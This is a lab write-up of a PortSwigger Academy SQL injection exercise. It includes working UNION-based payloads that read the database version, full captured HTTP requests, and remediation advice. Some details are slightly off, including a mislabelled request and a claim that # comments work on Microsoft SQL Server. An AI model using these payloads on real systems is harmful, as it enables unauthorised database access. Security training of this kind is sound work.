# PortSwigger Web Security Academy Lab Report: SQL Injection Attack, Querying the Database Type and Version on MySQL and Microsoft



**Report ID:** PS-LAB-004

**Author:** Abhiram (Abhi)

**Date:** February 02, 2026

**Lab Version:** PortSwigger Web Security Academy – SQL Injection Lab (Apprentice Level)



## Executive Summary:

**Vulnerability Type:** SQL injection allowing querying of database type and version

**Severity:** High (CVSS 3.1 Score: 8.6) “AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N”

**Description:** A SQL injection vulnerability was identified in the category parameter of the product filter endpoint (/filter). The flaw allowed a UNION-based attack to query and retrieve the database type and version from a MySQL or Microsoft SQL Server database. Exploitation was performed manually by injecting payloads to append a SELECT statement using @@version, displaying the version string in the response.

**Impact:** In a production environment, this could expose sensitive database metadata, enabling attackers to tailor further exploits (e.g., targeted SQLi payloads for MySQL- or MSSQL-specific features). This could lead to data extraction, privilege escalation, or full database compromise.

**Status:** Successfully exploited in a controlled lab environment only; no real-world systems were affected. This report is for educational purposes.



## Environment and Tools Used:

**Target:** Simulated e-commerce website from PortSwigger Web Security Academy (lab URL: e.g., https://*.web-security-academy.net)

**Browser:** Google Chrome (Version 120.0 or similar)

**Tools:** Burp Suite – for request interception, modification, and analysis

**Operating System:** Windows 11

**Test Date and Time:** February 02, 2026, approximately 07:44 PM IST



## Methodology:

The lab was conducted following ethical hacking best practices in a safe, simulated environment with no risk to production systems.
Accessed the lab via the "Access the lab" button in the PortSwigger Web Security Academy.
Copied the base URL and added it to Burp Suite as the target scope.
Enabled Intercept in Burp Proxy and navigated to a product category (e.g., "Gifts") to capture the HTTP GET request.
Disabled Intercept after capturing, then manually modified the category parameter:
category=' → triggered a database error (indicating lack of sanitization and confirming MySQL/MSSQL via syntax error).
category=' UNION SELECT 'abc','def'# → verified the number of columns (two, both text).
category=' UNION SELECT @@version, NULL# → retrieved and displayed the database version.
Analyzed captured requests and responses in Burp Suite's Target and Proxy > HTTP history tabs for confirmation.



## Detailed Findings:

**Vulnerable Endpoint:** GET /filter?category=...

Original Request (Captured in Burp Proxy):

GET /filter?category=Gifts HTTP/1.1
Host: *.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Connection: close
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9



Modified Request 1 (Injection Test – Error Triggered):

GET /filter?category=' UNION SELECT 'abc','def'# HTTP/1.1
Host: *.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Connection: close
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9


Response (Success):

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 10240

<!-- Page content includes product table with extra row: 'abc' as product name, 'def' as description →




Modified Request 2 (Successful Exploitation - Version Query):

GET /filter?category=' UNION SELECT @@version, NULL# HTTP/1.1
Host: *.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Connection: close
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9



Response (Success):

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 10240

<!-- Page content includes product table with extra row displaying the database version, e.g., "10.4.18-MariaDB" or "Microsoft SQL Server 2019 - 15.0.2000.5" as product name →




## Proof of Error (Injection Test):

![Proof of SQL Injection Error]()

Figure 1: Database error after injecting single quote ('), confirming lack of input sanitization and MySQL/MSSQL database.


## Proof of Successful Exploitation:

![Proof of Successful Exploitation]()

Figure 2: Database version string displayed in the product listing after the payload ' UNION SELECT @@version, NULL#, confirming successful query.


## Lab Solved:

![Lab Solved Congratulations]()

Figure 3: PortSwigger Academy confirmation of lab completion.



## Exploitation Explanation:

The injected single quote (') closed the string in the SQL query, allowing a UNION SELECT to append results. The payload used @@version (compatible with both MySQL and Microsoft SQL Server) to query the database version, matching the two-column structure of the original query. The # symbol was used to comment out the remainder of the query, ensuring compatibility with the target database.



## Risk Assessment:

Likelihood of Exploitation: High (user-controlled parameter with no sanitization or parameterization).
Potential Impact: High to Critical — exposure of database metadata; in real applications, could enable tailored attacks leading to data theft or escalation.
Affected Components: Backend MySQL or Microsoft SQL Server database (confirmed via exploitation and error patterns).



## Recommendations for Remediation:

Use prepared statements or parameterized queries (e.g., PDO in PHP, PreparedStatement in Java) to separate data from SQL code.
Implement strict input validation and sanitization for all user-supplied parameters.
Deploy a Web Application Firewall (WAF) to detect and block common SQL injection patterns.
Perform regular code reviews, static analysis, and dynamic scanning (e.g., using OWASP ZAP, sqlmap, or Burp Scanner).
Apply the principle of least privilege to database accounts used by the application.



## Conclusion and Lessons Learned:

This lab successfully demonstrated the identification and manual exploitation of a SQL injection vulnerability to query database metadata on MySQL or Microsoft SQL Server using Burp Suite.

Key Takeaways:

Always test query parameters for input validation flaws, especially in filters.
Understand database-specific syntax (e.g., @@version for MySQL/MSSQL and comment styles like # or --).
This exercise strengthened skills in UNION-based SQLi, payload crafting for different DBMS, HTTP interception, and professional report writing for ethical hacking and penetration testing scenarios.



## References:

PortSwigger Web Security Academy: SQL Injection
Lab specifically: SQL injection attack, querying the database type and version on MySQL and Microsoft
